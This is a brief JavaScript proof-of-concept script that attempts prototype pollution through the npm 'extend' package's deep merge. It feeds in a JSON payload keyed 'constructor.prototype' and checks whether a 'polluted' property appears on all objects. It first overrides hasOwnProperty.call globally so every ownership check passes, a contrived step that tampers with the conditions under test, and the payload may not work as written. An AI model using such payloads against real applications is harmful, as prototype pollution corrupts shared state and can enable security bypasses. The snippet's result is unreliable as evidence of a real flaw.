Object.prototype.hasOwnProperty.call = () => true;
let extend = require('extend');
let payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
var obj = {};
console.log({}.polluted);
extend(true, {}, payload);
console.log({}.polluted);